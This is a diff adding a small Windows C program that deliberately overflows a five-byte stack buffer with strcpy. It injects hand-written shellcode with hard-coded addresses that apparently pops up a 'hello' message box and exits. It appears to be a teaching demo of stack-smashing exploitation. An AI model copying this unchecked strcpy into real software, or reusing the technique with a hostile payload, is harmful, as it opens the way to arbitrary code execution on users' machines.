@@ -1,0 +1,15 @@
+#include<stdio.h>  
+#include<windows.h>  
+#pragma check_stack  
+  
+char payload[] = "aaaaaaaaaaaa\x2B\x40\xCC\x76\x33\xDB\x53\x68\x6F\x20\x20\x20\x68\x68\x65\x6C\x6C\x8B\xC4\x53\x68\x6F\x20\x20\x20\x68\x68\x65\x6C\x6C\x8B\xCC\x53\x50\x51\x53\xB8\x80\xEA\x7C\x75\xFF\xD0\x53\xB8\x00\x41\x0D\x77\xFF\xD0";  
+int main()  
+{  
+    LoadLibraryA("user32.dll");  
+    char buffer[5];  
+    strcpy(buffer, payload);  
+    printf("%s", buffer);  
+    return 0;  
+    system("pause");  
+}  
+
